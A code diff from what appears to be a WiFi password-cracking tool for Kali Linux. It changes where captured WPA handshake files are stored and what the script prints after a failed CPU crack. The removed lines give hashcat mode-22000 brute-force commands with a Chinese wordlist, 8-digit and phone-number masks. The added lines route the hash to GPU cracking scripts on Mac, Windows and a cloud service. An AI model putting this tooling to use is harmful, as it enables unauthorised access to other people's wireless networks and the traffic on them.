@@ -237,9 +237,12 @@ try:
 except Exception:
     pass
 
-# ---- 结果目录（以 WiFi 名称 + 时间戳命名）----
+# ---- 结果目录：统一到 wifi-crack-kali/结果/（以 WiFi 名 + 时间戳）----
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-RESULT_DIR = os.path.join(SCRIPT_DIR, "结果", "%s_%s" % (SSID_SAFE, datetime.now().strftime("%Y%m%d_%H%M%S")))
+KALI_ROOT = os.path.dirname(SCRIPT_DIR)  # wifi-crack-kali
+RESULT_DIR = os.path.join(
+    KALI_ROOT, "结果", "%s_%s" % (SSID_SAFE, datetime.now().strftime("%Y%m%d_%H%M%S"))
+)
 os.makedirs(RESULT_DIR, exist_ok=True)
 PCAP_FILE = os.path.join(RESULT_DIR, "%s.pcap" % SSID_SAFE)
 
@@ -689,21 +692,20 @@ def run_crack_pipeline(pcap_path, hash_path, bssid_target):
         print("  \033[92m╚══════════════════════════════════════════════════╝\033[0m")
         print()
     else:
-        print("  \033[93m[!] Kali CPU 爆破未成功，建议在 Mac 上用 GPU 加速:\033[0m")
+        print("  \033[93m[!] Kali CPU 未命中，请将握手包拷到 shared/captures 后用 GPU 破解:\033[0m")
         print()
         hash_path = os.path.join(RESULT_DIR, "%s.hc22000" % SSID_SAFE)
-        cn_dict = "字典/wifi_cn_combined.txt"
-        print("  \033[93m# 中国字典 (Mac GPU)\033[0m")
-        print("  hashcat -m 22000 '%s' -a 0 '%s' -d 1 -w 3 -O" % (hash_path, cn_dict))
+        print("  \033[93m# 1) 拷贝哈希到共享目录\033[0m")
+        print("  cp '%s' <仓库>/shared/captures/" % hash_path)
         print()
-        print("  \033[93m# 8位纯数字 (Mac GPU, 约2分钟)\033[0m")
-        print("  hashcat -m 22000 '%s' -a 3 '?d?d?d?d?d?d?d?d' -d 1 -w 3 -O" % hash_path)
+        print("  \033[93m# 2) Mac Metal\033[0m")
+        print("  bash mac/crack.sh --hash '%s'" % hash_path)
         print()
-        print("  \033[93m# 手机号掩码 (1开头11位, Mac GPU)\033[0m")
-        print("  hashcat -m 22000 '%s' -a 3 '1?d?d?d?d?d?d?d?d?d?d' -d 1 -w 3 -O" % hash_path)
+        print("  \033[93m# 3) Windows CUDA\033[0m")
+        print("  .\\windows\\crack.ps1 -Hash '%s'" % hash_path)
         print()
-        print("  \033[93m# 常见前缀+数字 (Mac GPU)\033[0m")
-        print("  hashcat -m 22000 '%s' -a 3 '?l?l?l?l?d?d?d?d' -d 1 -w 3 -O" % hash_path)
+        print("  \033[93m# 4) 算力云\033[0m")
+        print("  bash wifi-crack-notebook/crack_cloud.sh")
 
 if got_handshake:
     # ============================================================
